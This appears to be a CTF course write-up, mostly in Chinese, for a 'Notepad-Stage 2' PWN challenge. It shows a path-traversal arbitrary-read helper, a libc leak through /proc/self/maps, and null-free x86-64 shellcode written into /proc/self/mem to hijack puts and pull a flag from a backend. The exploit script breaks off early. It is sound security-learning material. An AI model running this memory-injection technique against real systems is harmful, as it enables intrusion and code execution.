<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple PWN 0x32(2023 HW - Notepad-Stage 2)
  #


  Description & Hint
  #


Try to get /flag_backend.
Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal.
Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.

  Source code
  #

呈上題

  Recon
  #

:::success
Special Thanks @cs-otaku For the most of the Inspiration of the WP
:::

Recap
在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下:
def read_any_file(file_name):
    payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
    offset = 0
    res = ''
    while(True):
        ret = dealing_cmd(r, 5, payload, offset=str(offset).encode())
        # print(ret, len(ret))
        if ret != 'Read note failed.' and ret != &#34;Couldn't open the file.&#34;:
            res += ret
            offset += 128
        else:
            log.success(res)
            break
    return res




==漏洞發想==
透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下虛擬內存探究 &ndash; 第一篇:C strings & /proc，要做的事情和我們的幾乎一樣，簡單說就是"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x32(2023 HW - Notepad-Stage 2)"><meta property="og:description" content="Simple PWN 0x32(2023 HW - Notepad-Stage 2) # Description & Hint # Try to get /flag_backend.
Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal. Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.
Source code # 呈上題
Recon # :::success Special Thanks @cs-otaku For the most of the Inspiration of the WP :::
Recap 在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下: def read_any_file(file_name): payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name offset = 0 res = '' while(True): ret = dealing_cmd(r, 5, payload, offset=str(offset).encode()) # print(ret, len(ret)) if ret != 'Read note failed.' and ret != &#34;Couldn't open the file.&#34;: res += ret offset += 128 else: log.success(res) break return res ==漏洞發想== 透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下虛擬內存探究 – 第一篇:C strings & /proc，要做的事情和我們的幾乎一樣，簡單說就是"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>Simple PWN 0x32(2023 HW - Notepad-Stage 2) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#description--hint>Description & Hint</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---arbitrary-read--arbitrary-write--shellcode>Exploit - Arbitrary Read → Arbitrary Write → Shellcode</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x322023-hw---notepad-stage-2>Simple PWN 0x32(2023 HW - Notepad-Stage 2)
<a class=anchor href=#simple-pwn-0x322023-hw---notepad-stage-2>#</a></h1><h2 id=description--hint>Description & Hint
<a class=anchor href=#description--hint>#</a></h2><blockquote><p>Try to get /flag_backend.</p><p>Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal.
Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.</p></blockquote><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>呈上題</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>:::success
Special Thanks @cs-otaku For the most of the Inspiration of the WP
:::</p><ul><li>Recap
在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_any_file</span>(file_name):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;../../../../../../&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>89</span> <span style=color:#f92672>-</span> len(file_name)) <span style=color:#f92672>+</span> file_name
</span></span><span style=display:flex><span>    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(<span style=color:#66d9ef>True</span>):
</span></span><span style=display:flex><span>        ret <span style=color:#f92672>=</span> dealing_cmd(r, <span style=color:#ae81ff>5</span>, payload, offset<span style=color:#f92672>=</span>str(offset)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(ret, len(ret))</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ret <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;Read note failed.&#39;</span> <span style=color:#f92672>and</span> ret <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;Couldn&#39;t open the file.&#34;</span>:
</span></span><span style=display:flex><span>            res <span style=color:#f92672>+=</span> ret
</span></span><span style=display:flex><span>            offset <span style=color:#f92672>+=</span> <span style=color:#ae81ff>128</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            log<span style=color:#f92672>.</span>success(res)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res
</span></span></code></pre></div></li></ul><ol><li><p>==漏洞發想==
透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下<a href=http://blog.coderhuo.tech/2017/10/12/Virtual_Memory_C_strings_proc/>虛擬內存探究 &ndash; 第一篇:C strings & /proc</a>，要做的事情和我們的幾乎一樣，簡單說就是</p><blockquote><p>/proc/[pid]/mem
This file can be used to access the pages of a process&rsquo;s memory through open(2), read(2), and lseek(2).
Permission to access this file is governed by a ptrace access mode PTRACE_MODE_ATTACH_FSCREDS check; see ptrace(2).</p><p>/proc/[pid]/maps
A file containing the currently mapped memory regions and their access permissions. See mmap(2) for some further information about memory mappings.
Permission to access this file is governed by a ptrace access mode PTRACE_MODE_READ_FSCREDS check; see ptrace(2).
The format of the file is:</p><pre><code>   address           perms offset  dev   inode       pathname
   00400000-00452000 r-xp 00000000 08:02 173521      /usr/bin/dbus-daemon
   00651000-00652000 r--p 00051000 08:02 173521      /usr/bin/dbus-daemon
   00652000-00655000 rw-p 00052000 08:02 173521      /usr/bin/dbus-daemon
   00e03000-00e24000 rw-p 00000000 00:00 0           [heap]
   00e24000-011f7000 rw-p 00000000 00:00 0           [heap]
   ...
   35b1800000-35b1820000 r-xp 00000000 08:02 135522  /usr/lib64/ld-2.15.so
   35b1a1f000-35b1a20000 r--p 0001f000 08:02 135522  /usr/lib64/ld-2.15.so
   35b1a20000-35b1a21000 rw-p 00020000 08:02 135522  /usr/lib64/ld-2.15.so
   35b1a21000-35b1a22000 rw-p 00000000 00:00 0
   35b1c00000-35b1dac000 r-xp 00000000 08:02 135870  /usr/lib64/libc-2.15.so
   35b1dac000-35b1fac000 ---p 001ac000 08:02 135870  /usr/lib64/libc-2.15.so
   35b1fac000-35b1fb0000 r--p 001ac000 08:02 135870  /usr/lib64/libc-2.15.so
   35b1fb0000-35b1fb2000 rw-p 001b0000 08:02 135870  /usr/lib64/libc-2.15.so
   ...
   f2c6ff8c000-7f2c7078c000 rw-p 00000000 00:00 0    [stack:986]
   ...
   7fffb2c0d000-7fffb2c2e000 rw-p 00000000 00:00 0   [stack]
   7fffb2d48000-7fffb2d49000 r-xp 00000000 00:00 0   [vdso]
</code></pre></blockquote><p>從以上訊息我們知道，/proc/[pid]/mem就是實際執行該隻process的memory，而/proc/[pid]/maps就是該隻process的memory mapping，所以關於怎麼利用可以看一下<a href=https://blog.csdn.net/dog250/article/details/108618568>csdn的這篇文章</a>，基本上要做的事情和我們差不多，目標都是去修改/proc/[pid]/mem中的value，不過中間有很多東西需要考慮:</p><ol><li>要寫甚麼shellcode</li><li>要寫去哪裡</li></ol></li><li><p>先看要寫去哪裡
按照前面所說應該是要寫/proc/[pid]/mem，但因為前面有提到他只能被open / read / lseek給access，所以目標應該是找出lseek的offset，並且把噁爛shellcode放進去；另外一個問題是我們不知道要寫到哪裡，所以我們可以利用前面的arbitrary read去看process的mapping為何，如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Read /proc/self/maps to leak Libc Base</span>
</span></span><span style=display:flex><span>maps_layout <span style=color:#f92672>=</span> read_any_file(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/proc/self/maps&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> int(maps_layout[<span style=color:#ae81ff>7</span>][:<span style=color:#ae81ff>12</span>], <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Libc Base address: </span><span style=color:#e6db74>{</span>hex(libc_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Puts Address: </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span></code></pre></div><p>這樣的話，我們就知道他位於整個memory layout，以及我們想要置換的puts symbols的位置</p></li><li><p>要寫甚麼
前面有提到我們需要寫shellcode進去，以替換puts的行為，所以我們需要寫些甚麼server才能噴flag給我們呢?如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e># Socket Config
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr_in</span> info;
</span></span><span style=display:flex><span>info.sin_family <span style=color:#f92672>=</span> PF_INET;
</span></span><span style=display:flex><span>info.sin_addr.s_addr <span style=color:#f92672>=</span> inet_addr(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>);
</span></span><span style=display:flex><span>info.sin_port <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>8765</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Connect to Backend
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>connect(fd, (<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>info, <span style=color:#66d9ef>sizeof</span>(info))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Write 0x8787 to fd
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>Command</span> cmd;
</span></span><span style=display:flex><span>cmd.cmd <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8787</span>;
</span></span><span style=display:flex><span>write(fd, <span style=color:#f92672>&amp;</span>cmd, <span style=color:#66d9ef>sizeof</span>(cmd));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Read the result from fd
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>Response</span> res;
</span></span><span style=display:flex><span>read(fd, <span style=color:#960050;background-color:#1e0010>$</span>rsp, <span style=color:#66d9ef>sizeof</span>(res);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Write the result from fd to stdout
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>write(<span style=color:#ae81ff>1</span>, <span style=color:#960050;background-color:#1e0010>$</span>rsp, <span style=color:#ae81ff>0x40</span>);
</span></span></code></pre></div><p>簡單來說，前面需要我們設定socket的config，然後用這個config連線到後端，並且把command置換成0x8787，傳送到後端給的fd，這樣後段就會直接噴flag給我們(準確來說是那個fd)，所以我們要承接fd接到的flag並且送到stdout，大概是這樣，但這一連串的操作其實是助教一開始在課堂中有提示，並且看了@cs-otaku的WP也有提到該步驟才知道，所以如果都不知道以上操作的話要怎麼辦呢?我們可以想辦法把backend的binary讀出來，這樣的話就只能自行把backend的binary讀出來再去分析裡面的奧義</p><p>我是直接用<a href=https://godbolt.org/>godbolt</a>搭配<a href=https://defuse.ca/online-x86-assembler.htm#disassembly>x86-64 disassembly</a>
:::spoiler godbolt Result
<img src=https://hackmd.io/_uploads/B1hxShgL6.png alt=image>
:::
不過正如@cs-otaku說的</p><blockquote><p>寫入content是用write去寫的。所以shellcode裡面不可以出現\x00這種東西</p></blockquote><p>所以我也是邊參考disassembly的結果慢慢看中間有沒有\x00的byte，如果有就要想其他的payload替換掉</p><ol><li>Socket Config
像是這邊我不知道<code>AF_INET</code>所代表的byte是多少就可以直接看godbolt的結果，另外syscall要用哪一個可以參考<a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>linux x86-64 syscall</a>，並且根據calling convention把shellcode擺好，切記看完之後要看一下轉換成shellcode看有沒有\x00的byte，可以用pwntools的asm function或是直接用<a href=https://defuse.ca/online-x86-assembler.htm#disassembly>x86-64 disassembly</a>都可以達到一樣的效果
<img src=https://hackmd.io/_uploads/HJUeP3lUp.png alt=image><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># int fd = socket(AF_INET, SOCK_STREAM, 0);</span>
</span></span><span style=display:flex><span>socket <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov al, 0x29
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdi, rdi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dil, 0x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rsi, rsi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov sil, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov r8, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div></li><li>Connect
這邊主要需要觀察protocol怎麼包，首先我們知道第一個參數是存$rdi，也就是存上一個syscall的return value存起來的$r8，至於$rsi的info address，其內容應該怎麼包含甚麼呢?我們先看一下<a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>linux x86-64 syscall</a>中的說明
<img src=https://hackmd.io/_uploads/BktiY2e8a.png alt=image>
他所需的是<code>struct sockaddr_in info;</code>，而實際去看看sockaddr_in會發現他的結構如下(<a href=https://blog.csdn.net/dongyanxia1000/article/details/80683738>csdn post</a>):<pre tabindex=0><code>struct sockaddr_in {
        short   sin_family;         //address family
        u_short sin_port;           //16 bit TCP/UDP port number
        struct  in_addr sin_addr;   //32 bit IP address
        char    sin_zero[8];        //not use, for align
};
</code></pre>就會對應到底下註解的地方，包含IP / Post / Internet Family之類的，所以我們就可以按照這個structure建構出來，short是2 bytes，而根據前面的byte code會發現<code>AF_INET</code>是\x0002，也就是兩個bytes，第二個是port也是兩個bytes，8765轉成hex就是0x223d；最後一個是IP address，總共是4 bytes的in_addr structure，如果想詳細了解in_addr的結構可以看<a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/ns-winsock2-in_addr?source=docs">MSDN</a>，但具體來說就是把<code>127.0.0.1</code>→<code>7f000001</code>，所以全部貼在一起並且轉成little endian的話就會變成==0x100007f3d220002==，但有一個非常大的問題，如果直接把該值push進到stack並取$rsp放到$rsi的話，整個流程會有太多的\x00，因此@cs-otaku提供了一個非常有創意的想法，就直接用扣的，反正只要最後放到stack的值是對的就好了<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># struct sockaddr_in info;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># info.sin_family = AF_INET;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># info.sin_addr.s_addr = inet_addr(&#34;127.0.0.1&#34;);</span>
</span></span><span style=display:flex><span><span style=color:#75715e># info.sin_port = htons(8765);</span>
</span></span><span style=display:flex><span><span style=color:#75715e># connect(fd, (struct sockaddr *)&amp;info, sizeof(info));</span>
</span></span><span style=display:flex><span>connect <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov al, 0x2a
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, 0xffffffffffffffff
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov r9, 0xfeffff80c2ddfffd
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    sub rsi, r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    push rsi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dl, 0x10
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div></li><li>Write
這一段主要是置換原本不應該出現的command，因為按照原本程式的流程，只會有CMD_Register→0x1 / CMD_Login→0x2 / CMD_GetFolder→0x11 / CMD_NewNote→0x12等這四種，分別會在對應的操作下傳到backend後讓他做對應的操作，現在我們要把cmd.cmd改成0x8787，之後用write把這個command寫到對應的fd中，如同其他command也那樣操作一樣<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># struct Command cmd;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># cmd.cmd = 0x8787; // #define CMD_Flag 0x8787</span>
</span></span><span style=display:flex><span><span style=color:#75715e># write(fd, &amp;cmd, sizeof(cmd));</span>
</span></span><span style=display:flex><span>write <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor r9, r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov r9w, 0x8787
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    push r9
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov al, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dl, 0xa4
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div></li><li>Read
這一段原本的command應該是<code>read(fd, &amp;res, sizeof(res))</code>，我們會去接res傳回來的結果，所以後面的size應該直接看res他的結構有多大而定，總共是一個uint32_t的code + 256個char，所以是260 bytes，也就是0x104，並且我們把res的地址傳給$rsp<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># read(fd, $rsp, sizeof(res));</span>
</span></span><span style=display:flex><span>read <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rdi, r8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dx, 0x104
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div></li><li>Write 2 Console
現在我們已經取得backend傳回來的response，但前端還沒辦法顯示，所以我們需要寫到stdout<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># write(1, $rsp, 0x40);</span>
</span></span><span style=display:flex><span>write2console <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rax, rax
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov al, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdi, rdi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dil, 0x1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov rsi, rsp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor rdx, rdx
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    mov dl, 0x40
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    syscall
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div></li></ol></li><li><p>接著我們就只要透過command 4的write note功能把構建好的shellcode，寫到/proc/self/mem對應的位置就好，也就是置換掉puts原本的操作，讓他再次call到puts的時候就會執行我們的shellcode</p></li></ol><h2 id=exploit---arbitrary-read--arbitrary-write--shellcode>Exploit - Arbitrary Read → Arbitrary Write → Shellcode
<a class=anchor href=#exploit---arbitrary-read--arbitrary-write--shellcode>#</a></h2><p>:::spoiler</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> tqdm <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cmd_dic <span style=color:#f92672>=</span> {<span style=color:#ae81ff>1</span>:<span style=color:#e6db74>&#39;Login&#39;</span>, <span style=color:#ae81ff>2</span>:<span style=color:#e6db74>&#39;Register&#39;</span>, <span style=color:#ae81ff>3</span>:<span style=color:#e6db74>&#39;New Note&#39;</span>, <span style=color:#ae81ff>4</span>:<span style=color:#e6db74>&#39;Edit Note&#39;</span>, <span style=color:#ae81ff>5</span>:<span style=color:#e6db74>&#39;Show Note&#39;</span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>dealing_cmd</span>(r, cmd, note_name<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;test&#39;</span>, content<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;test</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, offset<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;0&#39;</span>, random<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0&#39;</span>):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvlines(<span style=color:#ae81ff>7</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> cmd <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>or</span> cmd <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span>:
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline(str(cmd)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Username: &#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;sbk&#39;</span> <span style=color:#f92672>+</span> random<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Password: &#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;sbk&#39;</span> <span style=color:#f92672>+</span> random<span style=color:#f92672>.</span>encode())
